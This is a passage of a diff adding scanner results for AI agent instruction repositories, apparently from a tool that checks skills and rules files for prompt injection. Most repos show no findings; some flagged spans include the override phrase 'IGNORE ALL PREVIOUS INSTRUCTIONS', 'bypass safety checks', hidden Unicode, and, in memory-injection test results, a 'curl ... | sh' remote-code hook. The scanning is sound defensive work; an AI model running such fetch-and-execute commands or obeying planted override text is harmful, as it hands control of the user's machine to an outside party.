+      "ms": 710,
+      "findings": []
+    },
+    "levifig/rails-instructions": {
+      "repo": "levifig/rails-instructions",
+      "sha": "06ee708dd01d65a27b7582edcdaf877011d996f9",
+      "status": "ok",
+      "filesDownloaded": 36,
+      "filesScanned": 36,
+      "filesSkipped": 0,
+      "roles": {
+        "instruction": 35,
+        "unknown": 1
+      },
+      "agentFiles": 34,
+      "agentFileSample": [
+        ".cursor/rules/guidelines.mdc",
+        ".cursor/rules/rails-rules.mdc",
+        ".cursor/rules/rails/controllers.mdc",
+        ".cursor/rules/rails/views.mdc",
+        ".cursor/rules/rails/services.mdc",
+        ".cursor/rules/rails/hotwire.mdc",
+        ".cursor/rules/rails/background-jobs.mdc",
+        ".cursor/rules/rails/models.mdc",
+        ".cursor/rules/rails/testing.mdc",
+        ".cursor/rules/rails/core.mdc",
+        ".cursor/rules/rails/deployment.mdc",
+        ".cursor/rules/rails/security.mdc",
+        ".cursor/rules/rails/styling.mdc",
+        ".cursor/rules/rails/importmaps.mdc",
+        ".cursor/rules/rails/performance.mdc",
+        ".cursor/rules/rails/api.mdc",
+        ".cursor/rules/rails/mobile.mdc",
+        ".github/instructions/rails-views.instructions.md",
+        ".github/instructions/rails.instructions.md",
+        ".github/instructions/rails-background-jobs.instructions.md",
+        ".github/instructions/rails-deployment.instructions.md",
+        ".github/instructions/rails-styling.instructions.md",
+        ".github/instructions/rails-performance.instructions.md",
+        ".github/instructions/rails-importmaps.instructions.md",
+        ".github/instructions/rails-controllers.instructions.md"
+      ],
+      "scanMs": 85,
+      "ms": 376,
+      "findings": []
+    },
+    "TheWebScrapingClub/AI-Cursor-Scraping-Assistant": {
+      "repo": "TheWebScrapingClub/AI-Cursor-Scraping-Assistant",
+      "sha": "4755380be3ca6b63ff3d2fa1cb89dc54ab366f1e",
+      "status": "ok",
+      "filesDownloaded": 9,
+      "filesScanned": 9,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 6,
+        "instruction": 1,
+        "code": 2
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 25,
+      "ms": 284,
+      "findings": []
+    },
+    "kleosr/cursorkleosr": {
+      "repo": "kleosr/cursorkleosr",
+      "sha": "c3f8854fb6740234ca1b4edcad4a05d4cd73ce55",
+      "status": "ok",
+      "filesDownloaded": 9,
+      "filesScanned": 9,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 3,
+        "instruction": 3,
+        "unknown": 3
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        ".cursor/rules/workflow-memory.mdc",
+        "AGENTS.md"
+      ],
+      "scanMs": 38,
+      "ms": 293,
+      "findings": []
+    },
+    "yucezerey/turkish-anti-ai-skill": {
+      "repo": "yucezerey/turkish-anti-ai-skill",
+      "sha": "2abf2ffbba4392109dac78d510265859febd2c4e",
+      "status": "ok",
+      "filesDownloaded": 28,
+      "filesScanned": 27,
+      "filesSkipped": 0,
+      "roles": {
+        "instruction": 7,
+        "config": 4,
+        "unknown": 2,
+        "docs": 11,
+        "code": 3
+      },
+      "agentFiles": 6,
+      "agentFileSample": [
+        ".cursor/rules/turkish-anti-ai-skill.mdc",
+        "SKILL.md",
+        "GEMINI.md",
+        "skills/turkish-anti-ai-skill/SKILL.md",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 66,
+      "ms": 331,
+      "findings": []
+    },
+    "Mindrally/skills": {
+      "repo": "Mindrally/skills",
+      "sha": "7682ca77710e0971eab4e0ae5dddfa281aea0ba5",
+      "status": "ok",
+      "filesDownloaded": 276,
+      "filesScanned": 276,
+      "filesSkipped": 0,
+      "roles": {
+        "instruction": 266,
+        "unknown": 2,
+        "docs": 3,
+        "config": 5
+      },
+      "agentFiles": 265,
+      "agentFileSample": [
+        "supabase-development/SKILL.md",
+        "anthropic-claude-development/SKILL.md",
+        "zod-schema-validation/SKILL.md",
+        "microservices/SKILL.md",
+        "koa-typescript/SKILL.md",
+        "php-development/SKILL.md",
+        "pyspark-etl/SKILL.md",
+        "go-api-development/SKILL.md",
+        "ui-design/SKILL.md",
+        "monorepo/SKILL.md",
+        "monorepo-tamagui/SKILL.md",
+        "modern-web-development/SKILL.md",
+        "express-typescript/SKILL.md",
+        "responsive-design/SKILL.md",
+        "embedded-stm32/SKILL.md",
+        "terraform/SKILL.md",
+        "cheerio-parsing/SKILL.md",
+        "unity/SKILL.md",
+        "quarkus/SKILL.md",
+        "deep-learning-pytorch/SKILL.md",
+        "autogen-development/SKILL.md",
+        "clean-code/SKILL.md",
+        "backend-development/SKILL.md",
+        "deep-learning/SKILL.md",
+        "playwright-cursor-rules/SKILL.md"
+      ],
+      "scanMs": 635,
+      "ms": 1995,
+      "findings": []
+    },
+    "mbeijen/andrej-karpathy-skills-cursor-vscode": {
+      "repo": "mbeijen/andrej-karpathy-skills-cursor-vscode",
+      "sha": "a51d67704dc30e4adc9b322676548fa03fb078a7",
+      "status": "ok",
+      "filesDownloaded": 11,
+      "filesScanned": 11,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "instruction": 2,
+        "config": 2,
+        "manifest": 1,
+        "docs": 2,
+        "code": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 28,
+      "ms": 270,
+      "findings": []
+    },
+    "ilindaniel/ponytail-lite": {
+      "repo": "ilindaniel/ponytail-lite",
+      "sha": "e7b42dc2d384a702240dea4d52a7bf5530b821b6",
+      "status": "ok",
+      "filesDownloaded": 5,
+      "filesScanned": 5,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "instruction": 2
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "AGENTS.md"
+      ],
+      "scanMs": 22,
+      "ms": 445,
+      "findings": []
+    },
+    "GeiserX/LynxPrompt": {
+      "repo": "GeiserX/LynxPrompt",
+      "sha": "4faa9c0ace27d423a5ca1e443e43e694f796a809",
+      "status": "ok",
+      "filesDownloaded": 722,
+      "filesScanned": 722,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 221,
+        "config": 54,
+        "code": 417,
+        "docs": 19,
+        "instruction": 7,
+        "mcp-config": 1,
+        "manifest": 3
+      },
+      "agentFiles": 4,
+      "agentFileSample": [
+        "test/AGENTS.md",
+        ".claude/settings.json",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 977,
+      "ms": 4786,
+      "findings": []
+    },
+    "sohaibt/product-mode": {
+      "repo": "sohaibt/product-mode",
+      "sha": "09d37f0e39a006eb3662735165058ce405ad073e",
+      "status": "ok",
+      "filesDownloaded": 36,
+      "filesScanned": 36,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 3,
+        "code": 8,
+        "docs": 13,
+        "instruction": 7,
+        "config": 4,
+        "manifest": 1
+      },
+      "agentFiles": 5,
+      "agentFileSample": [
+        "skills/product-review/SKILL.md",
+        "skills/decision/SKILL.md",
+        "skills/preflight/SKILL.md",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 109,
+      "ms": 397,
+      "findings": []
+    },
+    "KbWen/agentic-os": {
+      "repo": "KbWen/agentic-os",
+      "sha": "21b2a9a0caa673a57fd744d07b72a122f0583c66",
+      "status": "ok",
+      "filesDownloaded": 727,
+      "filesScanned": 727,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 131,
+        "unknown": 38,
+        "docs": 460,
+        "config": 41,
+        "instruction": 56,
+        "mcp-config": 1
+      },
+      "agentFiles": 55,
+      "agentFileSample": [
+        ".agents/skills/using-git-worktrees/SKILL.md",
+        ".agents/skills/test-driven-development/SKILL.md",
+        ".agents/skills/database-design/SKILL.md",
+        ".agents/skills/systematic-debugging/SKILL.md",
+        ".agents/skills/dispatching-parallel-agents/SKILL.md",
+        ".agents/skills/auth-security/SKILL.md",
+        ".agents/skills/api-design/SKILL.md",
+        ".agents/skills/karpathy-principles/SKILL.md",
+        ".agents/skills/production-readiness/SKILL.md",
+        ".agents/skills/doc-lookup/SKILL.md",
+        ".agents/skills/frontend-patterns/SKILL.md",
+        ".agents/skills/verification-before-completion/SKILL.md",
+        ".agents/skills/subagent-driven-development/SKILL.md",
+        ".agents/skills/red-team-adversarial/SKILL.md",
+        ".claude/settings.json",
+        ".claude/agents/acx-handoff.md",
+        ".claude/agents/acx-reviewer.md",
+        ".claude/agents/acx-tester.md",
+        ".claude/agents/acx-shipper.md",
+        ".claude/agents/acx-implementer.md",
+        ".claude/commands/govern-audit.md",
+        ".claude/commands/ask-openrouter.md",
+        ".claude/commands/govern-docs.md",
+        ".claude/commands/implement.md",
+        ".claude/commands/decide.md"
+      ],
+      "scanMs": 1195,
+      "ms": 2017,
+      "findings": [
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": ".agentcortex/context/archive/fix-pr470-review-findings-20261017.md",
+          "line": 52,
+          "span": "\\uFEFF"
+        },
+        {
+          "ruleId": "EX-018",
+          "severity": "high",
+          "source": "signature",
+          "title": "Confused-deputy request",
+          "file": ".agentcortex/context/archive/agentic-os-governance-tuning-20260423.md",
+          "line": 68,
+          "span": "bypass safety checks"
+        },
+        {
+          "ruleId": "EX-018",
+          "severity": "high",
+          "source": "signature",
+          "title": "Confused-deputy request",
+          "file": ".agentcortex/context/archive/agentic-os-governance-tuning-20260423.md",
+          "line": 81,
+          "span": "bypass safety checks"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": ".agentcortex/context/archive/fix-capabilities-bom-tolerance-20260620.md",
+          "line": 31,
+          "span": "\\uFEFF"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": ".agentcortex/context/archive/fix-capabilities-bom-tolerance-20260620.md",
+          "line": 49,
+          "span": "\\uFEFF"
+        },
+        {
+          "ruleId": "EX-004",
+          "severity": "high",
+          "source": "signature",
+          "title": "HTML comment smuggling",
+          "file": "AGENTS.md",
+          "line": 18,
+          "span": "<!-- Safety invariant cluster \u2014 hard cap ~5 one-liners; to add one, demote one. Placement test: hazard reachable from..."
+        }
+      ]
+    },
+    "edvardgrishin27/nativeprompt": {
+      "repo": "edvardgrishin27/nativeprompt",
+      "sha": "f2ab8f3b97dfbccb2cedaebecd95c12a4e247266",
+      "status": "ok",
+      "filesDownloaded": 111,
+      "filesScanned": 111,
+      "filesSkipped": 0,
+      "roles": {
+        "instruction": 7,
+        "unknown": 5,
+        "config": 14,
+        "code": 38,
+        "docs": 47
+      },
+      "agentFiles": 4,
+      "agentFileSample": [
+        "codex/integration/plugins/nativeprompt/skills/nativeprompt/SKILL.md",
+        "SKILL.md",
+        "AGENTS.md",
+        "nativeprompt/assets/skill/SKILL.md"
+      ],
+      "scanMs": 325,
+      "ms": 944,
+      "findings": [
+        {
+          "ruleId": "EX-002",
+          "severity": "high",
+          "source": "signature",
+          "title": "Instructions addressed to AI",
+          "file": "CLAIMS.ru.md",
+          "line": 90,
+          "span": "IGNORE ALL PREVIOUS INSTRUCTIONS"
+        },
+        {
+          "ruleId": "EX-002",
+          "severity": "high",
+          "source": "signature",
+          "title": "Instructions addressed to AI",
+          "file": "CLAIMS.md",
+          "line": 89,
+          "span": "IGNORE ALL PREVIOUS INSTRUCTIONS"
+        },
+        {
+          "ruleId": "EX-018",
+          "severity": "high",
+          "source": "signature",
+          "title": "Confused-deputy request",
+          "file": "nativeprompt/rules/_docs/platform.claude.com-docs-en-build-with-claude-prompt-engineering-claude-prompting-best-practices.md.txt",
+          "line": 896,
+          "span": "bypass safety checks"
+        },
+        {
+          "ruleId": "EX-018",
+          "severity": "high",
+          "source": "signature",
+          "title": "Confused-deputy request",
+          "file": "nativeprompt/rules/_docs/raw.githubusercontent.com-QwenLM-qwen-code-main-docs-users-features-commands.md.txt",
+          "line": 139,
+          "span": "bypass approval prompts"
+        }
+      ]
+    },
+    "jrenaldi79/harness-engineering": {
+      "repo": "jrenaldi79/harness-engineering",
+      "sha": "09cb115ec9dca18949ebceb0876160dae0a0e277",
+      "status": "ok",
+      "filesDownloaded": 187,
+      "filesScanned": 187,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 34,
+        "unknown": 28,
+        "config": 14,
+        "instruction": 12,
+        "code": 92,
+        "mcp-config": 3,
+        "manifest": 4
+      },
+      "agentFiles": 10,
+      "agentFileSample": [
+        "plugins/documentation/skills/documentation/SKILL.md",
+        "tests/evals/fixtures/level-3-enforced/.claude/settings.json",
+        "tests/evals/fixtures/level-3-enforced/CLAUDE.md",
+        "tests/evals/fixtures/level-5-autonomous/.claude/settings.json",
+        "tests/evals/fixtures/level-5-autonomous/.claude/skills/plan/SKILL.md",
+        "tests/evals/fixtures/level-5-autonomous/CLAUDE.md",
+        ".claude/settings.json",
+        "skills/setup/SKILL.md",
+        "skills/readiness/SKILL.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 235,
+      "ms": 776,
+      "findings": []
+    },
+    "Lolner95/AIGX": {
+      "repo": "Lolner95/AIGX",
+      "sha": "b9669b317e76b0280bd183ab4708644bf2d37112",
+      "status": "ok",
+      "filesDownloaded": 436,
+      "filesScanned": 436,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 75,
+        "code": 125,
+        "instruction": 27,
+        "config": 84,
+        "unknown": 119,
+        "manifest": 6
+      },
+      "agentFiles": 3,
+      "agentFileSample": [
+        "template/integrations/AGENTS.md",
+        "integrations/claude-code/CLAUDE.md",
+        "integrations/agents/AGENTS.md"
+      ],
+      "scanMs": 701,
+      "ms": 1274,
+      "findings": []
+    },
+    "solanabr/ai-kit": {
+      "repo": "solanabr/ai-kit",
+      "sha": "c17266a25f1907a1debd48eda315c3be52888bf5",
+      "status": "ok",
+      "filesDownloaded": 216,
+      "filesScanned": 216,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 12,
+        "code": 81,
+        "config": 15,
+        "mcp-config": 2,
+        "docs": 15,
+        "instruction": 91
+      },
+      "agentFiles": 91,
+      "agentFileSample": [
+        ".mcp.json",
+        "plugin/skills/solana-ai-kit/SKILL.md",
+        ".claude/settings.json",
+        ".claude/agents/solana-guide.md",
+        ".claude/agents/token-engineer.md",
+        ".claude/agents/tech-docs-writer.md",
+        ".claude/agents/rust-backend-engineer.md",
+        ".claude/agents/defi-engineer.md",
+        ".claude/agents/pinocchio-engineer.md",
+        ".claude/agents/solana-frontend-engineer.md",
+        ".claude/agents/solana-researcher.md",
+        ".claude/agents/devops-engineer.md",
+        ".claude/agents/game-architect.md",
+        ".claude/agents/unity-engineer.md",
+        ".claude/agents/solana-qa-engineer.md",
+        ".claude/agents/solana-architect.md",
+        ".claude/agents/anchor-engineer.md",
+        ".claude/agents/mobile-engineer.md",
+        ".claude/commands/test-rust.md",
+        ".claude/commands/audit-infra.md",
+        ".claude/commands/migrate-web3.md",
+        ".claude/commands/crew.md",
+        ".claude/commands/scaffold.md",
+        ".claude/commands/explore.md",
+        ".claude/commands/implement.md"
+      ],
+      "scanMs": 658,
+      "ms": 1444,
+      "findings": []
+    },
+    "globalmpc/nomore": {
+      "repo": "globalmpc/nomore",
+      "sha": "7e2d2b2abc2d4b6229f191cb25c98d2bdf2c8f1e",
+      "status": "ok",
+      "filesDownloaded": 89,
+      "filesScanned": 89,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 7,
+        "instruction": 4,
+        "code": 37,
+        "unknown": 34,
+        "docs": 6,
+        "manifest": 1
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        "rules/AGENTS.md",
+        "rules/CLAUDE.md"
+      ],
+      "scanMs": 190,
+      "ms": 786,
+      "findings": []
+    },
+    "LeanMeanCleanApps/CleanMinimalApi": {
+      "repo": "LeanMeanCleanApps/CleanMinimalApi",
+      "sha": "fd0b4df79d62ee34e525f7927bafd793b5c830fa",
+      "status": "ok",
+      "filesDownloaded": 252,
+      "filesScanned": 251,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 10,
+        "unknown": 171,
+        "config": 26,
+        "instruction": 42,
+        "code": 2
+      },
+      "agentFiles": 40,
+      "agentFileSample": [
+        ".agents/skills/time-provider/SKILL.md",
+        ".agents/skills/cancellation/SKILL.md",
+        ".agents/skills/presentation-integration-tests/SKILL.md",
+        ".agents/skills/releases/SKILL.md",
+        ".agents/skills/ci-for-your-solution/SKILL.md",
+        ".agents/skills/branches-and-pull-requests/SKILL.md",
+        ".agents/skills/docs-and-voice/SKILL.md",
+        ".agents/skills/expose-a-use-case/SKILL.md",
+        ".agents/skills/json-serialization/SKILL.md",
+        ".agents/skills/configuration-and-environments/SKILL.md",
+        ".agents/skills/template-authoring/SKILL.md",
+        ".agents/skills/errors-and-exceptions/SKILL.md",
+        ".agents/skills/health-checks/SKILL.md",
+        ".agents/skills/security-findings/SKILL.md",
+        ".agents/skills/optional-token-auth/SKILL.md",
+        ".agents/skills/docker-and-compose/SKILL.md",
+        ".agents/skills/unit-tests/SKILL.md",
+        ".agents/skills/integration-tests/SKILL.md",
+        ".agents/skills/csharp-house-style/SKILL.md",
+        ".agents/skills/clean-architecture-layers/SKILL.md",
+        ".agents/skills/add-a-use-case/SKILL.md",
+        ".agents/skills/writing-a-skill/SKILL.md",
+        ".agents/skills/paging/SKILL.md",
+        ".agents/skills/xml-docs-and-openapi/SKILL.md",
+        ".agents/skills/packages-and-dependencies/SKILL.md"
+      ],
+      "scanMs": 430,
+      "ms": 989,
+      "findings": []
+    },
+    "danielvm-git/bigpowers": {
+      "repo": "danielvm-git/bigpowers",
+      "sha": "72f5e4c8b43f60cf86b37078ad8cd7e22daf67aa",
+      "status": "ok",
+      "filesDownloaded": 5910,
+      "filesScanned": 5910,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 163,
+        "config": 530,
+        "docs": 3574,
+        "instruction": 984,
+        "code": 635,
+        "manifest": 23,
+        "mcp-config": 1
+      },
+      "agentFiles": 978,
+      "agentFileSample": [
+        ".qwen/skills/spike-prototype/SKILL.md",
+        ".qwen/skills/define-success/SKILL.md",
+        ".qwen/skills/respond-review/SKILL.md",
+        ".qwen/skills/compose-workflow/SKILL.md",
+        ".qwen/skills/diagnose-root/SKILL.md",
+        ".qwen/skills/plan-work/SKILL.md",
+        ".qwen/skills/verify-work/SKILL.md",
+        ".qwen/skills/deepen-architecture/SKILL.md",
+        ".qwen/skills/design-interface/SKILL.md",
+        ".qwen/skills/setup-environment/SKILL.md",
+        ".qwen/skills/session-state/SKILL.md",
+        ".qwen/skills/diagnose-stall/SKILL.md",
+        ".qwen/skills/craft-skill/SKILL.md",
+        ".qwen/skills/evolve-skill/SKILL.md",
+        ".qwen/skills/search-skills/SKILL.md",
+        ".qwen/skills/run-planning/SKILL.md",
+        ".qwen/skills/map-codebase/SKILL.md",
+        ".qwen/skills/maintain-wiki/SKILL.md",
+        ".qwen/skills/align-grid/SKILL.md",
+        ".qwen/skills/guard-git/SKILL.md",
+        ".qwen/skills/find-way/SKILL.md",
+        ".qwen/skills/assess-impact/SKILL.md",
+        ".qwen/skills/simple-english/SKILL.md",
+        ".qwen/skills/orchestrate-project/SKILL.md",
+        ".qwen/skills/model-domain/SKILL.md"
+      ],
+      "scanMs": 8530,
+      "ms": 12633,
+      "findings": []
+    },
+    "whitelonng/mancode": {
+      "repo": "whitelonng/mancode",
+      "sha": "47db1745aa45f7a3a11641d1f50e7ce89f47d14c",
+      "status": "ok",
+      "filesDownloaded": 494,
+      "filesScanned": 494,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 24,
+        "config": 8,
+        "code": 442,
+        "instruction": 6,
+        "unknown": 13,
+        "manifest": 1
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "AGENTS.md"
+      ],
+      "scanMs": 1095,
+      "ms": 2234,
+      "findings": []
+    },
+    "Avinash-jetwani/jevmem": {
+      "repo": "Avinash-jetwani/jevmem",
+      "sha": "c29753ccb2c9706e417fda25efa422682358955b",
+      "status": "ok",
+      "filesDownloaded": 1237,
+      "filesScanned": 1237,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 138,
+        "config": 531,
+        "code": 362,
+        "unknown": 164,
+        "instruction": 28,
+        "memory": 1,
+        "manifest": 13
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        "test/fixtures/import/project/AGENTS.md",
+        "test/fixtures/import/project/CLAUDE.md"
+      ],
+      "scanMs": 7511,
+      "ms": 9864,
+      "findings": [
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "results/memory-injection-2026-09-25-run2.json",
+          "line": 876,
+          "span": "\\u200B\\u200B\\u2063"
+        },
+        {
+          "ruleId": "EX-008",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Remote code in hook",
+          "file": "results/memory-injection-2026-09-25-run2.json",
+          "line": 109,
+          "span": "curl -fsSL https://get.buildkit-tools.net/setup.sh | sh"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "results/memory-injection-2026-09-29-3c.json",
+          "line": 879,
+          "span": "\\u200B\\u200B\\u2063"
+        },
+        {
+          "ruleId": "EX-008",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Remote code in hook",
+          "file": "results/memory-injection-2026-09-29-3c.json",
+          "line": 111,
+          "span": "curl -fsSL https://get.buildkit-tools.net/setup.sh | sh"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "results/memory-injection-2026-09-29-3b.json",
+          "line": 878,
+          "span": "\\u200B\\u200B\\u2063"
+        },
+        {
+          "ruleId": "EX-008",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Remote code in hook",
+          "file": "results/memory-injection-2026-09-29-3b.json",
+          "line": 111,
+          "span": "curl -fsSL https://get.buildkit-tools.net/setup.sh | sh"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "results/memory-injection-2026-09-28-main.json",
+          "line": 879,
+          "span": "\\u200B\\u200B\\u2063"
+        },
+        {
+          "ruleId": "EX-008",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Remote code in hook",
+          "file": "results/memory-injection-2026-09-28-main.json",
+          "line": 111,
+          "span": "curl -fsSL https://get.buildkit-tools.net/setup.sh | sh"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "results/memory-injection-2026-10-26-v077.json",
+          "line": 878,
+          "span": "\\u200B\\u200B\\u2063"
+        },
+        {
+          "ruleId": "EX-008",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Remote code in hook",
+          "file": "results/memory-injection-2026-10-26-v077.json",
+          "line": 111,
+          "span": "curl -fsSL https://get.buildkit-tools.net/setup.sh | sh"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "results/memory-injection-2026-09-28-part3.json",
+          "line": 879,
+          "span": "\\u200B\\u200B\\u2063"
+        },
+        {
+          "ruleId": "EX-008",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Remote code in hook",
+          "file": "results/memory-injection-2026-09-28-part3.json",
+          "line": 111,
+          "span": "curl -fsSL https://get.buildkit-tools.net/setup.sh | sh"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "results/memory-injection-2026-11-09-v077-rerun.json",
+          "line": 878,
+          "span": "\\u200B\\u200B\\u2063"
+        },
+        {
+          "ruleId": "EX-008",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Remote code in hook",
+          "file": "results/memory-injection-2026-11-09-v077-rerun.json",
+          "line": 111,
+          "span": "curl -fsSL https://get.buildkit-tools.net/setup.sh | sh"
+        },
+        {
+          "ruleId": "EX-001",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Hidden Unicode instructions",
+          "file": "results/memory-injection-2026-09-25-run1.json",
+          "line": 877,
+          "span": "\\u200B\\u200B\\u2063"
+        },
+        {
+          "ruleId": "EX-008",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Remote code in hook",
+          "file": "results/memory-injection-2026-09-25-run1.json",
+          "line": 109,
+          "span": "curl -fsSL https://get.buildkit-tools.net/setup.sh | sh"
+        },
+        {
+          "ruleId": "EX-011",
+          "severity": "high",
+          "source": "signature",
+          "title": "Secrets in agent reach",
+          "file": "eval/guard-dev.jsonl",
+          "line": 52,
+          "span": "[redacted: 39 characters]"
+        }
+      ]
+    },
+    "uucz/moyu": {
+      "repo": "uucz/moyu",
+      "sha": "f9ef7d0a01fe10c177a15f0f311c35acb0dad6b5",
+      "status": "ok",
+      "filesDownloaded": 167,
+      "filesScanned": 167,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 54,
+        "docs": 56,
+        "config": 9,
+        "unknown": 25,
+        "instruction": 22,
+        "manifest": 1
+      },
+      "agentFiles": 16,
+      "agentFileSample": [
+        "codex/moyu/SKILL.md",
+        "codex/moyu-en/SKILL.md",
+        "codebuddy/moyu/SKILL.md",
+        "codebuddy/moyu-en/SKILL.md",
+        "templates/AGENTS.md",
+        "skills/moyu/SKILL.md",
+        "skills/moyu-ko/SKILL.md",
+        "skills/moyu-en/SKILL.md",
+        "skills/moyu-fr/SKILL.md",
+        "skills/moyu-strict/SKILL.md",
+        "skills/moyu-ja/SKILL.md",
+        "skills/moyu-lite/SKILL.md",
+        "antigravity/moyu/SKILL.md",
+        "antigravity/moyu-en/SKILL.md",
+        "opencode/moyu/SKILL.md",
+        "opencode/moyu-en/SKILL.md"
+      ],
+      "scanMs": 330,
+      "ms": 1235,
+      "findings": []
+    },
+    "handsomeZR-netizen/mathmodel-skill": {
+      "repo": "handsomeZR-netizen/mathmodel-skill",
+      "sha": "e0e65c8c56f1f0435fb76e99490dbae7c2704d59",
+      "status": "ok",
+      "filesDownloaded": 109,
+      "filesScanned": 109,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 9,
+        "config": 22,
+        "docs": 49,
+        "instruction": 9,
+        "code": 20
+      },
+      "agentFiles": 3,
+      "agentFileSample": [
+        "SKILL.md",
+        "skills/mathmodel-skill/SKILL.md",
+        "AGENTS.md"
+      ],
+      "scanMs": 212,
+      "ms": 605,
+      "findings": []
+    },
+    "DengShiyingA/harmonyos-ai-skill": {
+      "repo": "DengShiyingA/harmonyos-ai-skill",
+      "sha": "77c78fc98a3d4a0b1caf666bd92bdc0183e6d31a",
+      "status": "ok",
+      "filesDownloaded": 64,
+      "filesScanned": 34,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 10,
+        "config": 2,
+        "docs": 15,
+        "instruction": 4,
+        "code": 3
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "harmonyos-development/SKILL.md"
+      ],
+      "scanMs": 82,
+      "ms": 1077,
+      "findings": []
+    },
+    "YMuskrat/agentctx": {
+      "repo": "YMuskrat/agentctx",
+      "sha": "d990cce2c5a6d9efcd90faa50a57df878d20256c",
+      "status": "ok",
+      "filesDownloaded": 54,
+      "filesScanned": 54,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 6,
+        "unknown": 9,
+        "code": 33,
+        "config": 4,
+        "instruction": 1,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 80,
+      "ms": 1285,
+      "findings": []
+    },
+    "63Klabs/atlantis-with-kiro-ai": {
+      "repo": "63Klabs/atlantis-with-kiro-ai",
+      "sha": "3ec6a1e870b12a39159363d1f6e14be46278d395",
+      "status": "ok",
+      "filesDownloaded": 52,
+      "filesScanned": 52,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 1,
+        "docs": 33,
+        "instruction": 17,
+        "config": 1
+      },
+      "agentFiles": 11,
+      "agentFileSample": [
+        "examples/agents-md/AGENTS.md",
+        "examples/skills/plan-from-issue/SKILL.md",
+        "examples/skills/release-changelog-package/SKILL.md",
+        "examples/skills/atlantis-platform-resources/SKILL.md",
+        "examples/skills/import-issues-from-github/SKILL.md",
+        "examples/skills/plan-from-spec/SKILL.md",
+        "examples/skills/audit-update-python-packages/SKILL.md",
+        "examples/skills/update-aws-lambda-layers/SKILL.md",
+        "examples/skills/audit-update-npm-packages/SKILL.md",
+        ".kiro/steering/maintaining-examples.md",
+        "AGENTS.md"
+      ],
+      "scanMs": 103,
+      "ms": 484,
+      "findings": []
+    },
+    "UBayouski/Grimsheet": {
+      "repo": "UBayouski/Grimsheet",
+      "sha": "f97be955d92cebfe12849154d54de31b60c39f34",
+      "status": "ok",
+      "filesDownloaded": 236,
+      "filesScanned": 236,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 26,
+        "unknown": 21,
+        "instruction": 8,
+        "code": 146,
+        "docs": 30,
+        "manifest": 1,
+        "mcp-config": 1,
+        "hook": 3
+      },
+      "agentFiles": 10,
+      "agentFileSample": [
+        "powers/grimsheet-playtest/skills/play-level/SKILL.md",
+        ".kiro/settings/mcp.json",
+        ".kiro/hooks/sound-on-finish.json",
+        ".kiro/hooks/check-before-finish.json",
+        ".kiro/hooks/test-on-save.json",
+        ".kiro/steering/product.md",
+        ".kiro/steering/structure.md",
+        ".kiro/steering/formulas.md",
+        ".kiro/steering/sheet-ui.md",
+        ".kiro/steering/tech.md"
+      ],
+      "scanMs": 371,
+      "ms": 842,
+      "findings": []
+    },
+    "gitfool/kiro-dungeon": {
+      "repo": "gitfool/kiro-dungeon",
